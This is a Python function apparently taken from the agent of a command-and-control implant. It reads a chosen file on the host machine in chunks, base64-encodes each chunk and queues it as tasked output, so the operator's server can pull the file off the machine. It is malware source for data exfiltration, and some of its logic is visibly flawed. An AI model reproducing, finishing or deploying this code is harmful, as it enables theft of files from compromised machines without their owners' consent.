def download(task_id, path):
    global responses

    path = path.replace("\\", "/")
    # print("Downloading " + path)

    # chunkSize = 512000
    chunkSize = 10000
    fileSize = os.path.getsize(path)
    chunks = math.ceil(fileSize / chunkSize)
    fullpath = os.path.abspath(path)

    # print("FILESIZE = " + str(fileSize))  

    # print(str(chunks) + " chunks needed")


    response = {
            "total_chunks": chunks, 
            "task_id": task_id,
            "full_path": fullpath,
            "host": "",
            "is_screenshot": "false"
        }
    
    responses.append(response)


    def download_thread():
        i = 1
        file_id = ""

        while i != chunks +1:
            if result:
                for item in result['responses']:
                    if item['task_id'] == task_id and item['status'] == "success":
                        # print("HO TROVATO IL LA RIPOSTA SUCCESS PER QUESTO TASK")
                        if file_id == "":
                            file_id = item['file_id']
                        result['responses'].remove(item)
                        f = open(fullpath, 'r')
                        f.seek((i-1)*chunkSize)
                        blob = f.read(chunkSize)
                        chunk_data = to64(blob)

                        if i == chunks:
                            print("i == chunks")
                            response = {
                                    "chunk_num": i, 
                                    "file_id": file_id, 
                                    "chunk_data": chunk_data,
                                    "task_id": task_id,
                                    "completed": True
                                }
                            # print("[OLD RESPONSEs]: " + str(responses))
                            responses.append(response)
                            # print("[NEW RESPONSEs]: " + str(responses))
                            f.close()
                            i +=1
                            print("\t- Download Done")
                            exit()

                        else:
                            print("i != chunks")
                            response = {
                                    "chunk_num": i, 
                                    "file_id": file_id, 
                                    "chunk_data": chunk_data,
                                    "task_id": task_id
                                }
                            # print("[OLD RESPONSEs]: " + str(responses))
                            responses.append(response)
                            # print("[NEW RESPONSEs]: " + str(responses))                        
                            f.close()
                        i += 1

                    if item['task_id'] == task_id and item['status'] != "success":
                        print("ERROR SENDING FILE")
                        break


    d = threading.Thread(target=download_thread, args=())
    d.start()